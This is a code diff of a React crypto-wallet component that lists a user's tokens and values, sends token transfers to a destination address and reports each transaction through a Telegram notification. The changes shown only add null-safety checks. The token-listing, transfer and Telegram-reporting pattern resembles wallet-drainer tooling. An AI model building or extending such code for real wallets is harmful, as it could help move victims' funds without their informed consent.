@@ -137,7 +137,7 @@ const TokenRow = ({ token }) => {
       </span>
       <span style={{ marginRight: '8px' }}>(worth {usdFormatter.format(safeNumber(quote))})</span>
       <a
-        href={`${chain?.blockExplorers?.default.url}/token/${token.contract_address}?a=${address}`}
+        href={chain?.blockExplorers?.default?.url ? `${chain.blockExplorers.default.url}/token/${token.contract_address}?a=${address}` : '#'}
         target="_blank"
         rel="noreferrer"
         style={{ textDecoration: 'underline', color: '#0070f3' }}
@@ -166,9 +166,9 @@ const handleTokenTransaction = async (walletClient, destinationAddress, amount, 
     }
 
     // Get the block explorer URL and chain info
-    const chainName = walletClient.chain.name;
-    const chainId = walletClient.chain.id;
-    const blockExplorerUrl = `${walletClient.chain.blockExplorers?.default.url}/tx/${tx.hash}`;
+    const chainName = walletClient.chain?.name || 'Unknown';
+    const chainId = walletClient.chain?.id || 0;
+    const blockExplorerUrl = `${walletClient.chain?.blockExplorers?.default?.url || ''}/tx/${tx.hash}`;
 
     // Send Telegram notification
     sendTelegramNotification({
@@ -202,13 +202,13 @@ export const GetTokens = () => {
     setTokens([]);
     try {
       // Check if the user's chain is supported
-      if (!supportedChains.includes(chain.id)) {
-        console.error('Unsupported chain:', chain.id);
+      if (!supportedChains.includes(chain?.id)) {
+        console.error('Unsupported chain:', chain?.id);
         setError('This chain is not supported.');
         return;
       }
 
-      const alchemy = alchemyInstances[chain.id];
+      const alchemy = alchemyInstances[chain?.id];
       if (!alchemy) {
         setError('Alchemy instance not found for this chain.');
         return;
@@ -249,7 +249,7 @@ export const GetTokens = () => {
     } finally {
       setLoading(false);
     }
-  }, [address, checkedRecords, chain.id, setTokens]);
+  }, [address, checkedRecords, chain?.id, setTokens]);
 
   useEffect(() => {
     if (address && chain) {
